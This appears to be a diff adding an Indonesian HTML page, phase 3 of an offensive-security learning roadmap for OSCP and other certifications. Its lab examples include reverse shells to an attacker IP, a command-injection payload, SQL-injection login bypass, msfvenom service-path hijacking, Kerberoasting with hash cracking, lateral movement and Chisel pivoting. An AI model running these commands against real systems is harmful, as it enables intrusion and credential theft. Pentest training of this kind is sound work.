@@ -1,0 +1,687 @@
+content = """<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fase 3 — Sertifikasi & Lab Practice | Pixel Detective Academy</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body class="page-phase">
+
+  <nav class="toc">
+    <div class="toc-inner">
+      <span class="toc-title">// FASE 3</span>
+      <a href="index.html">🏠 Home</a>
+      <a href="fase1.html">1</a>
+      <a href="fase2.html">2</a>
+      <a href="fase3.html" class="active">3</a>
+      <a href="fase4.html">4</a>
+      <a href="fase5.html">5</a>
+      <a href="fase6.html">6</a>
+      <button id="printBtn" class="btn-print">🖨️ PDF</button>
+    </div>
+    <div class="progress-bar" id="progressBar"></div>
+  </nav>
+
+  <main class="container">
+
+    <!-- ===== PHASE HERO ===== -->
+    <header class="phase-hero reveal">
+      <div class="phase-num-big">03</div>
+      <div class="badge">FASE 3 • SERTIFIKASI & LAB</div>
+      <h1>Sertifikasi & Lab Practice</h1>
+      <p class="tagline">"Sertifikat bukan tujuan. Bukti praktikal adalah tujuannya."</p>
+      <p class="phase-duration">⏱️ 3–6 Bulan • 🎯 Target: 1 sertifikat praktikal + jalur OSCP</p>
+      <button class="mark-done-btn" data-phase="3">✓ Tandai Fase Ini Selesai</button>
+    </header>
+
+    <!-- ===== MENGAPA FASE INI ===== -->
+    <section class="reveal">
+      <h2>🎯 Mengapa Sertifikasi Penting?</h2>
+      <p>
+        Di industri offensive security, <strong>sertifikasi praktikal</strong> adalah bukti
+        bahwa kamu bisa <em>benar-benar compromise mesin</em>, bukan hanya hafal teori.
+        Recruiter sering menggunakan sertifikasi sebagai filter awal — tapi yang membuatmu
+        diterima adalah <strong>portfolio + skill praktikal</strong>.
+      </p>
+      <div class="callout">
+        <strong>Prinsip Pixel Detective:</strong> Sertifikasi adalah <em>validasi</em>, bukan
+        <em>tujuan</em>. Jangan kejar "kertas" — kejar kemampuan. Sertifikat akan mengikuti.
+      </div>
+
+      <h3>Peta Sertifikasi Offensive Security</h3>
+      <table class="roadmap-table">
+        <thead>
+          <tr>
+            <th>Sertifikasi</th>
+            <th>Level</th>
+            <th>Format</th>
+            <th>Harga</th>
+            <th>Kapan Ambil</th>
+            <th>Nilai Pasar</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>eJPT</strong> (eLearnSecurity)</td>
+            <td>Entry</td>
+            <td>Praktikal (48 jam)</td>
+            <td>~$200</td>
+            <td>Setelah Fase 2</td>
+            <td>⭐⭐⭐ (CV awal)</td>
+          </tr>
+          <tr>
+            <td><strong>PNPT</strong> (TCM Security)</td>
+            <td>Entry–Mid</td>
+            <td>Praktikal (5 hari) + debrief</td>
+            <td>~$499</td>
+            <td>Setelah 10+ mesin HTB</td>
+            <td>⭐⭐⭐⭐ (alternatif OSCP)</td>
+          </tr>
+          <tr>
+            <td><strong>OSCP</strong> (OffSec)</td>
+            <td>Mid (standar industri)</td>
+            <td>Praktikal (24 jam)</td>
+            <td>~$1,749</td>
+            <td>Setelah PNPT + 30+ mesin</td>
+            <td>⭐⭐⭐⭐⭐ (wajib)</td>
+          </tr>
+          <tr>
+            <td><strong>OSWE</strong> (OffSec)</td>
+            <td>Advanced Web</td>
+            <td>Praktikal (48 jam)</td>
+            <td>~$1,749</td>
+            <td>Setelah OSCP + fokus web</td>
+            <td>⭐⭐⭐⭐ (web specialist)</td>
+          </tr>
+          <tr>
+            <td><strong>CRTP</strong> (Altered Security)</td>
+            <td>AD Specialist</td>
+            <td>Praktikal (24 jam)</td>
+            <td>~$499</td>
+            <td>Setelah OSCP + fokus AD</td>
+            <td>⭐⭐⭐⭐ (AD specialist)</td>
+          </tr>
+          <tr>
+            <td><strong>CRTO</strong> (Zero-Point Security)</td>
+            <td>Red Team</td>
+            <td>Praktikal (48 jam)</td>
+            <td>~$499</td>
+            <td>Setelah OSCP + fokus red team</td>
+            <td>⭐⭐⭐⭐ (red team)</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout">
+        <strong>Rekomendasi Pixel Detective:</strong> Mulai dari <strong>PNPT</strong> (lebih
+        ramah & murah) → lanjut <strong>OSCP</strong> (standar industri) → spesialisasi
+        (<strong>OSWE/CRTP/CRTO</strong>) sesuai jalur Fase 4.
+      </div>
+    </section>
+
+   <!-- ===== 3.1 PERSIAPAN OSCP ===== -->
+<section class="reveal oscp-section">
+  <div class="section-header">
+    <h2>🎯 3.1 Persiapan OSCP — Roadmap 4 Bulan</h2>
+    <p class="section-subtitle">
+      OSCP adalah target utama. Ini roadmap persiapan 4 bulan yang realistis — dengan
+      target terukur per bulan.
+    </p>
+  </div>
+
+  <!-- ================================================== -->
+  <!-- BULAN 1: Fondasi Mesin Linux -->
+  <!-- ================================================== -->
+  <div class="month-block">
+    <h3 class="month-title">📅 Bulan 1: Fondasi Mesin Linux</h3>
+    
+    <ol class="steps-list">
+      <li><strong>Selesaikan 15 mesin Easy di HackTheBox</strong> (retired) — fokus Linux.</li>
+      <li><strong>Dokumentasi setiap mesin</strong> dengan template writeup:
+        <em>Recon → Enumeration → Exploitation → Privilege Escalation → Lessons Learned</em>.
+      </li>
+      <li><strong>Latih manual exploitation</strong> — jangan langsung Metasploit. Pahami setiap langkah.</li>
+      <li><strong>Kuasai Nmap advanced</strong> — <code>-sC</code>, <code>-sV</code>, <code>-p-</code>, <code>--script</code>, <code>-oA</code>.</li>
+      <li><strong>Kuasai Gobuster/ffuf</strong> — directory & subdomain enumeration.</li>
+    </ol>
+
+    <div class="example-box">
+      <h4>💡 Contoh: Workflow Enumeration Mesin HTB (Linux)</h4>
+      <div class="code-wrapper">
+<pre><code class="language-bash"># ── STEP 1: Nmap full scan ──
+nmap -sC -sV -p- --min-rate 5000 -oA nmap/full 10.10.10.X
+
+# ── STEP 2: Analisis hasil ──
+# Contoh output:
+# PORT     STATE SERVICE VERSION
+# 22/tcp   open  ssh     OpenSSH 8.2p1
+# 80/tcp   open  http    Apache httpd 2.4.41
+# 8080/tcp open  http    Tomcat 9.0
+
+# ── STEP 3: Web enumeration ──
+ffuf -u http://10.10.10.X/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -mc 200,301,302,403 -t 50
+
+# ── STEP 4: Cek setiap endpoint yang ditemukan ──
+curl -s http://10.10.10.X/admin/ | head -50
+curl -s http://10.10.10.X/backup/ | head -50
+
+# ── STEP 5: Jika ada login page, coba default creds ──
+# admin:admin, admin:password, root:root
+
+# ── STEP 6: Jika ada file upload, coba upload shell ──
+# Buat payload: bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
+# Upload → akses → reverse shell
+
+# ── STEP 7: Setelah foothold, privesc enumeration ──
+# Upload linpeas.sh
+wget http://10.10.14.X/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.out
+
+# ── STEP 8: Analisis output linpeas ──
+# Cari: SUID, sudo -l, cron job, writable file, kernel exploit</code></pre>
+      </div>
+      <p class="code-note">
+        <strong>Penjelasan:</strong> Workflow ini adalah alur standar untuk setiap mesin HTB.
+        Latih sampai menjadi refleks — di exam OSCP, waktu adalah segalanya.
+      </p>
+    </div>
+
+    <div class="target-box">
+      <strong>🎯 Target Bulan 1:</strong> 15 mesin Easy selesai + 15 writeup terdokumentasi +
+      nyaman dengan Nmap, ffuf, dan linpeas.
+    </div>
+  </div>
+
+  <!-- ================================================== -->
+  <!-- BULAN 2: Windows & Privilege Escalation -->
+  <!-- ================================================== -->
+  <div class="month-block">
+    <h3 class="month-title">📅 Bulan 2: Windows & Privilege Escalation</h3>
+    
+    <ol class="steps-list">
+      <li><strong>Selesaikan 10 mesin Windows Easy/Medium</strong> di HTB.</li>
+      <li><strong>Kuasai Windows privesc</strong>:
+        <ul class="sub-list">
+          <li>Misconfigured service (unquoted path, weak permission)</li>
+          <li>Token impersonation (SeImpersonate, SeAssignPrimaryToken)</li>
+          <li>AlwaysInstallElevated</li>
+          <li>Credential dumping (Mimikatz, SAM, LSASS)</li>
+        </ul>
+      </li>
+      <li><strong>Kuasai Linux privesc</strong>:
+        <ul class="sub-list">
+          <li>SUID/SGID abuse (GTFOBins)</li>
+          <li>Cron job misconfiguration</li>
+          <li>Sudo misconfig (<code>sudo -l</code>)</li>
+          <li>Kernel exploit (Dirty Pipe, Dirty Cow)</li>
+          <li>Capability abuse (<code>getcap -r /</code>)</li>
+        </ul>
+      </li>
+      <li><strong>Gunakan linpeas/winpeas</strong> — tapi pahami outputnya, jangan buta.</li>
+    </ol>
+
+    <div class="example-box">
+      <h4>💡 Contoh: Windows Privilege Escalation — Unquoted Service Path</h4>
+      <div class="code-wrapper">
+<pre><code class="language-bash"># ── STEP 1: Enumeration service ──
+# Dari shell user biasa (misal: www-data / IIS AppPool)
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"
+
+# Contoh output mencurigakan:
+# VulnerableService  C:\\Program Files\\Vulnerable Service\\service.exe
+
+# ── STEP 2: Analisis ──
+# Path tidak di-quote → Windows akan coba:
+#   C:\\Program.exe
+#   C:\\Program Files\\Vulnerable.exe
+#   C:\\Program Files\\Vulnerable Service\\service.exe
+# Jika kita bisa tulis di C:\\ atau C:\\Program Files\\, kita bisa hijack.
+
+# ── STEP 3: Cek permission folder ──
+icacls "C:\\Program Files\\Vulnerable Service"
+# Jika user biasa punya Write/Full Control → exploitable
+
+# ── STEP 4: Buat payload ──
+# Generate reverse shell dengan msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f exe -o Vulnerable.exe
+
+# ── STEP 5: Upload payload ke path yang bisa ditulis ──
+# Misal: C:\\Program Files\\Vulnerable.exe
+
+# ── STEP 6: Restart service ──
+sc stop VulnerableService
+sc start VulnerableService
+
+# ── STEP 7: Terima reverse shell ──
+nc -lvnp 4444
+# Shell sebagai SYSTEM
+
+# ── Penjelasan ──
+# Windows mencari executable di setiap spasi pada path yang tidak di-quote.
+# Jika folder parent writable, attacker bisa menaruh executable malicious
+# dengan nama yang cocok → dieksekusi sebagai SYSTEM.</code></pre>
+      </div>
+      <p class="code-note">
+        <strong>Penjelasan:</strong> Unquoted Service Path adalah salah satu privesc Windows
+        paling umum di OSCP. Kuncinya: cari service dengan path berspasi & tanpa tanda kutip,
+        lalu cek izin folder induknya.
+      </p>
+    </div>
+
+    <div class="target-box">
+      <strong>🎯 Target Bulan 2:</strong> 10 mesin Windows selesai + paham 5+ teknik privesc
+      Windows & Linux + bisa membaca output linpeas/winpeas dengan percaya diri.
+    </div>
+  </div>
+
+  <!-- ================================================== -->
+  <!-- BULAN 3: Active Directory & Buffer Overflow -->
+  <!-- ================================================== -->
+  <div class="month-block">
+    <h3 class="month-title">📅 Bulan 3: Active Directory & Buffer Overflow</h3>
+    
+    <ol class="steps-list">
+      <li><strong>Pelajari AD Basics</strong>:
+        <ul class="sub-list">
+          <li>Struktur: Domain, Forest, OU, Group, User, Computer, GPO</li>
+          <li>Protokol: LDAP, Kerberos, DNS, SMB, RPC</li>
+          <li>Serangan: Kerberoasting, AS-REP Roasting, ACL Abuse, Lateral Movement</li>
+        </ul>
+      </li>
+      <li><strong>Selesaikan HTB Pro Lab Dante/Offshore</strong> (minimal 10 mesin).</li>
+      <li><strong>Latih Buffer Overflow</strong> (Windows x86) — masih muncul di OSCP.
+        Alat: Immunity Debugger, mona.py, msfvenom.
+      </li>
+      <li><strong>Latih Pivoting</strong>: SSH Tunnel, Chisel, Ligolo-ng, Proxychains.</li>
+    </ol>
+
+    <div class="example-box">
+      <h4>💡 Contoh: Kerberoasting — Full Attack Chain</h4>
+      <div class="code-wrapper">
+<pre><code class="language-bash"># ── STEP 1: Dapatkan foothold sebagai domain user biasa ──
+# (misal: dari phishing, web exploit, atau mesin yang sudah dikompromi)
+# Kita punya: DOMAIN.LOCAL\\user:password
+
+# ── STEP 2: Enumerasi user dengan SPN ──
+# Dari mesin Linux (attacker), gunakan Impacket
+python3 GetUserSPNs.py -dc-ip 10.10.10.10 \
+  DOMAIN.LOCAL/user:password \
+  -request -outputfile kerberoast.txt
+
+# Output contoh:
+# ServicePrincipalName  Name      MemberOf          PasswordLastSet
+# MSSQLSvc/db01:1433   svc_sql   Domain Users      2024-01-15
+# HTTP/web01           svc_web   Domain Admins     2024-02-20
+
+# ── STEP 3: Ekstrak hash dari file ──
+cat kerberoast.txt
+# $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/db01:1433*$...
+
+# ── STEP 4: Crack hash dengan Hashcat ──
+hashcat -m 13100 kerberoast.txt \
+  /usr/share/wordlists/rockyou.txt \
+  --force
+
+# Jika berhasil:
+# $krb5tgs$23$*svc_sql$...:Summer2024!
+
+# ── STEP 5: Gunakan credential untuk Lateral Movement ──
+crackmapexec smb 10.10.10.0/24 \
+  -u svc_sql -p 'Summer2024!' --shares
+
+# ── STEP 6: Jika punya akses admin ──
+psexec.py DOMAIN.LOCAL/svc_sql:'Summer2024!'@10.10.10.20
+
+# ── STEP 7: Ulangi enumerasi → cari Domain Admin ──
+# Cek siapa yang login, cari credential di memory (Mimikatz)
+
+# ── Penjelasan ──
+# Kerberoasting = minta TGS ticket → crack offline → akses service.
+# Tidak meninggalkan log mencurigakan di Domain Controller.
+# Mitigasi: password panjang (25+ karakter) atau gMSA.</code></pre>
+      </div>
+      <p class="code-note">
+        <strong>Penjelasan:</strong> Kerberoasting adalah serangan AD paling umum di OSCP.
+        Kuncinya: akun service seringkali memiliki password lemah dan hak akses tinggi.
+        Proses cracking dilakukan secara offline = tidak terdeteksi.
+      </p>
+    </div>
+
+    <div class="example-box">
+      <h4>💡 Contoh: Pivoting dengan Chisel</h4>
+      <div class="code-wrapper">
+<pre><code class="language-bash"># ── Skenario ──
+# Mesin A: 10.10.10.5 (sudah dikompromi, punya akses ke 172.16.0.0/24)
+# Mesin B: 172.16.0.10 — hanya bisa diakses dari Mesin A
+# Tujuan: scan & eksploit Mesin B dari mesin attacker
+
+# ── STEP 1: Siapkan Chisel Server di Attacker ──
+chisel server -p 8000 --reverse
+
+# ── STEP 2: Upload & jalankan Chisel Client di Mesin A ──
+wget http://10.10.14.X/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client 10.10.14.X:8000 R:socks
+
+# ── STEP 3: Konfigurasi Proxychains ──
+# Tambahkan di /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+# ── STEP 4: Akses jaringan melalui pivot ──
+proxychains nmap -sT -Pn -p 22,80,445 172.16.0.10
+proxychains curl http://172.16.0.10/
+
+# ── Alternatif: Ligolo-ng ──
+# Lebih cepat & stabil untuk lalu lintas tinggi</code></pre>
+      </div>
+      <p class="code-note">
+        <strong>Penjelasan:</strong> Pivoting = menembus jaringan yang tidak langsung terjangkau.
+        Chisel & Ligolo-ng adalah alat paling populer. Latih sampai bisa setup dalam &lt; 5 menit.
+      </p>
+    </div>
+
+    <div class="target-box">
+      <strong>🎯 Target Bulan 3:</strong> Selesaikan HTB Pro Lab Dante/Offshore (10+ mesin) + paham
+      alur serangan AD lengkap + bisa melakukan pivoting dengan Chisel/Ligolo-ng.
+    </div>
+  </div>
+
+  <!-- ================================================== -->
+  <!-- BULAN 4: Simulasi Exam & Report Writing -->
+  <!-- ================================================== -->
+  <div class="month-block">
+    <h3 class="month-title">📅 Bulan 4: Simulasi Exam & Penulisan Laporan</h3>
+    
+    <ol class="steps-list">
+      <li><strong>Kerjakan 3–5 mesin Medium/Hard</strong> di HTB — selesaikan dalam 4 jam per mesin.</li>
+      <li><strong>Simulasi ujian 24 jam</strong>: 5 mesin (2 Easy, 2 Medium, 1 Hard), tanpa akses internet
+        (kecuali dokumentasi).
+      </li>
+      <li><strong>Latih penulisan laporan</strong> — OSCP menilai dokumentasi, bukan hanya flag.</li>
+      <li><strong>Evaluasi kelemahan</strong>: jika gagal privesc, ulangi materi Bulan 2.</li>
+    </ol>
+
+    <div class="example-box">
+      <h4>💡 Contoh: Template Laporan Ujian OSCP</h4>
+      <div class="code-wrapper">
+<pre><code class="language-markdown"># OSCP Exam Report — [Nama Kamu]
+# OSID: [OS-XXXXX]
+# Tanggal: [YYYY-MM-DD]
+
+## 1. Ringkasan Eksekutif
+Saya berhasil mengompromi 4 dari 5 mesin target, memperoleh 80/100 poin.
+Mesin berhasil: Target1, Target2, Target3, Target4
+Mesin belum selesai: Target5 (berhasil akses awal, belum bisa privesc)
+
+## 2. Target 1 — 10.10.10.10 (Linux, 20 Poin)
+
+### 2.1 Reconnaissance
+nmap -sC -sV -p- -oA nmap/target1 10.10.10.10
+Port terbuka:
+  22/tcp — SSH (OpenSSH 8.2)
+  80/tcp — HTTP (Apache 2.4.41)
+
+### 2.2 Enumerasi
+ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/... -mc 200,301
+Ditemukan:
+  /admin — halaman login
+  /backup — berisi file db.sql
+
+### 2.3 Eksploitasi
+Kerentanan: SQL Injection di halaman login
+Payload:
+  username: admin'--
+  password: sembarang
+Hasil: Masuk sebagai admin → akses panel
+
+Command Injection di /admin/ping:
+POST /admin/ping HTTP/1.1
+Host: 10.10.10.10
+Content-Type: application/x-www-form-urlencoded
+ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
+
+Reverse Shell terbuka → shell sebagai www-data
+
+### 2.4 Privilege Escalation
+Cek hak sudo: sudo -l
+# (ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
+
+Eksploitasi:
+echo 'import os; os.system("/bin/bash")' > /tmp/x.py
+sudo /usr/bin/python3 /tmp/x.py
+
+Hasil: Shell root
+
+### 2.5 Bendera
+  local.txt: a1b2c3d4...
+  proof.txt: e5f6g7h8...
+
+### 2.6 Tangkapan Layar
+  [SS1 — Hasil Nmap]
+  [SS2 — Login berhasil]
+  [SS3 — Reverse shell]
+  [SS4 — Sudo privileges]
+  [SS5 — Root & proof.txt]
+
+## 3. Target 2 — 10.10.10.11 (Windows, 20 Poin)
+[...]
+
+## 4. Catatan Pembelajaran
+Target 5 belum selesai. Perlu latihan lebih pada eksploitasi kernel
+dan enumerasi capabilities.</code></pre>
+      </div>
+      <p class="code-note">
+        <strong>Penjelasan:</strong> Laporan OSCP harus <em>dapat direproduksi</em> — penguji harus bisa mengulang setiap langkah. Sertakan perintah, tangkapan layar, dan penjelasan mengapa langkah tersebut diambil.
+      </p>
+    </div>
+
+    <div class="target-box">
+      <strong>🎯 Target Bulan 4:</strong> Lulus simulasi ujian 24 jam (minimal 70/100 poin) +
+      laporan lengkap untuk 5 mesin dengan format yang rapi dan dapat direproduksi.
+    </div>
+  </div>
+</section>
+
+
+    <!-- ===== 3.2 LAB PRACTICE ===== -->
+    <section class="reveal">
+      <h2>🧪 3.2 Lab Practice — Di Mana Berlatih</h2>
+      <p class="section-sub">
+        Lab adalah tempat detektif mengasah insting. Pilih platform yang sesuai levelmu.
+      </p>
+      <table class="roadmap-table">
+        <thead>
+          <tr>
+            <th>Platform</th>
+            <th>Fokus</th>
+            <th>Harga</th>
+            <th>Rekomendasi</th>
+            <th>Link</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>TryHackMe</strong></td>
+            <td>Guided learning, pemula</td>
+            <td>Gratis / $14/bln</td>
+            <td>⭐ Wajib Fase 1–2</td>
+            <td>tryhackme.com</td>
+          </tr>
+          <tr>
+            <td><strong>HackTheBox</strong></td>
+            <td>Realistic machines, CTF</td>
+            <td>Gratis / $20/bln</td>
+            <td>⭐ Wajib Fase 3</td>
+            <td>hackthebox.com</td>
+          </tr>
+          <tr>
+            <td><strong>PortSwigger Academy</strong></td>
+            <td>Web security labs</td>
+            <td>Gratis</td>
+            <td>⭐ Wajib Fase 2</td>
+            <td>portswigger.net/web-security</td>
+          </tr>
+          <tr>
+            <td><strong>PentesterLab</strong></td>
+            <td>Web & badges</td>
+            <td>$20/bln</td>
+            <td>Opsional (web focus)</td>
+            <td>pentesterlab.com</td>
+          </tr>
+          <tr>
+            <td><strong>VulnHub</strong></td>
+            <td>VM offline</td>
+            <td>Gratis</td>
+            <td>Latihan tanpa internet</td>
+            <td>vulnhub.com</td>
+          </tr>
+          <tr>
+            <td><strong>HTB Pro Labs</strong></td>
+            <td>AD, enterprise</td>
+            <td>~$90/bln</td>
+            <td>Persiapan OSCP/CRTP</td>
+            <td>hackthebox.com/prolabs</td>
+          </tr>
+          <tr>
+            <td><strong>OffSec PG</strong></td>
+            <td>OSCP-like machines</td>
+            <td>~$19/bln</td>
+            <td>Persiapan OSCP</td>
+            <td>offsec.com</td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="callout">
+        <strong>Tips:</strong> Jangan hanya "selesaikan mesin" — <em>pahami</em> setiap langkah. Mesin yang sama bisa dikerjakan ulang dengan metode berbeda untuk memperdalam pemahaman.
+      </div>
+    </section>
+
+    <!-- ===== 3.3 STRATEGI BELAJAR ===== -->
+    <section class="reveal">
+      <h2>📚 3.3 Strategi Belajar Efektif</h2>
+      <h3>Metode "Pixel by Pixel"</h3>
+      <ol class="steps-list">
+        <li><strong>Fokus satu teknik per sesi</strong> — jangan campur 5 teknik dalam 1 jam.</li>
+        <li><strong>Dokumentasi sambil belajar</strong> — tulis writeup <em>selama</em> mengerjakan, bukan setelahnya.</li>
+        <li><strong>Review mingguan</strong> — baca ulang writeup, cari pola, identifikasi kelemahan.</li>
+        <li><strong>Ajarkan ke orang lain</strong> — blog post, thread Twitter, atau diskusi komunitas. Mengajar adalah cara belajar terbaik.</li>
+        <li><strong>Konsistensi &gt; intensitas</strong> — 2 jam/hari konsisten lebih efektif daripada 10 jam sekali seminggu.</li>
+      </ol>
+
+      <h3>Jadwal Harian yang Realistis</h3>
+      <table class="roadmap-table">
+        <thead>
+          <tr>
+            <th>Waktu</th>
+            <th>Aktivitas</th>
+            <th>Durasi</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Pagi (30 menit)</td>
+            <td>Baca writeup/CVE baru</td>
+            <td>30 menit</td>
+          </tr>
+          <tr>
+            <td>Siang (1 jam)</td>
+            <td>Latihan mesin HTB/THM</td>
+            <td>60 menit</td>
+          </tr>
+          <tr>
+            <td>Malam (30 menit)</td>
+            <td>Dokumentasi writeup</td>
+            <td>30 menit</td>
+          </tr>
+          <tr>
+            <td>Weekend (4 jam)</td>
+            <td>Mesin Medium/Hard + review</td>
+            <td>4 jam</td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="callout">
+        <strong>Total: ~2 jam/hari + 4 jam weekend = 18 jam/minggu.</strong> Dalam 4 bulan = ~288 jam. Cukup untuk persiapan OSCP yang serius.
+      </div>
+    </section>
+
+    <!-- ===== 3.4 CHECKLIST ===== -->
+    <section class="reveal">
+      <h2>✅ Checklist Fase 3</h2>
+      <div class="checklist">
+        <label><input type="checkbox" data-check="3-1"> Memilih jalur sertifikasi (eJPT/PNPT → OSCP)</label>
+        <label><input type="checkbox" data-check="3-2"> Menyelesaikan 15+ mesin HTB Easy (Linux)</label>
+        <label><input type="checkbox" data-check="3-3"> Menyelesaikan 10+ mesin HTB Windows</label>
+        <label><input type="checkbox" data-check="3-4"> Kuasai Linux privilege escalation (5+ teknik)</label>
+        <label><input type="checkbox" data-check="3-5"> Kuasai Windows privilege escalation (5+ teknik)</label>
+        <label><input type="checkbox" data-check="3-6"> Paham Active Directory basics</label>
+        <label><input type="checkbox" data-check="3-7"> Bisa melakukan Kerberoasting & AS-REP Roasting</label>
+        <label><input type="checkbox" data-check="3-8"> Bisa melakukan pivoting (chisel/ligolo-ng)</label>
+        <label><input type="checkbox" data-check="3-9"> Menyelesaikan HTB Pro Lab Dante/Offshore (10+ mesin)</label>
+        <label><input type="checkbox" data-check="3-10"> Punya 25+ writeup terdokumentasi</label>
+        <label><input type="checkbox" data-check="3-11"> Lulus simulasi exam 24 jam (70+/100)</label>
+        <label><input type="checkbox" data-check="3-12"> Bisa menulis report OSCP format resmi</label>
+        <label><input type="checkbox" data-check="3-13"> Mendapatkan minimal 1 sertifikat praktikal (eJPT/PNPT)</label>
+        <label><input type="checkbox" data-check="3-14"> Terdaftar untuk exam OSCP</label>
+      </div>
+    </section>
+
+    <!-- ===== 3.5 RESOURCES ===== -->
+    <section class="reveal">
+      <h2>📖 3.5 Resources Wajib</h2>
+      <h3>Buku</h3>
+      <ul class="steps-list">
+        <li><strong>"Penetration Testing"</strong> — Georgia Weidman (fondasi)</li>
+        <li><strong>"The Hacker Playbook 3"</strong> — Peter Kim (praktikal)</li>
+        <li><strong>"Hack The Box: Writeups"</strong> — koleksi writeup komunitas</li>
+        <li><strong>"OSCP Journey"</strong> — blog post TJ Null (roadmap terkenal)</li>
+      </ul>
+
+      <h3>Course</h3>
+      <ul class="steps-list">
+        <li><strong>PEN-200</strong> (OffSec) — course resmi OSCP</li>
+        <li><strong>Practical Ethical Hacking</strong> (TCM Security) — gratis di YouTube</li>
+        <li><strong>PNPT Course</strong> (TCM Security) — persiapan PNPT</li>
+        <li><strong>Linux Privilege Escalation</strong> (TCM Security) — gratis</li>
+        <li><strong>Windows Privilege Escalation</strong> (TCM Security) — gratis</li>
+      </ul>
+
+      <h3>Tools Wajib</h3>
+      <ul class="steps-list">
+        <li><strong>Recon</strong>: nmap, ffuf, gobuster, subfinder, httpx</li>
+        <li><strong>Web</strong>: Burp Suite, sqlmap (hati-hati), nikto</li>
+        <li><strong>Exploit</strong>: Metasploit (terbatas di OSCP), searchsploit</li>
+        <li><strong>Privesc</strong>: linpeas, winpeas, GTFOBins, LOLBAS</li>
+        <li><strong>AD</strong>: Impacket, CrackMapExec, BloodHound, Rubeus</li>
+        <li><strong>Pivoting</strong>: chisel, ligolo-ng, proxychains</li>
+      </ul>
+
+      <div class="callout">
+        <strong>Catatan OSCP:</strong> Metasploit hanya boleh digunakan di <strong>1 mesin</strong> dari 5. Latih manual exploitation — jangan bergantung pada Metasploit.
+      </div>
+    </section>
+
+    <!-- ===== PHASE NAV ===== -->
+    <nav class="phase-nav">
+      <a href="fase2.html" class="phase-nav-prev">← Fase 2: Offensive Fundamentals</a>
+      <a href="fase4.html" class="phase-nav-next">Fase 4: Spesialisasi →</a>
+    </nav>
+  </main>
+
+  <footer class="footer">
+    <p><strong>PIXEL DETECTIVE ACADEMY</strong> — Fase 3</p>
+    <p class="footer-tagline">"Zoom in. Find the flaw. Own the pixel."</p>
+    <p class="footer-note">Dibuat untuk pembelajaran legal & etis. Selalu praktik di lingkungan yang diizinkan.</p>
+  </footer>
+
+  <script src="app.js"></script>
+
+</body>
+</html>
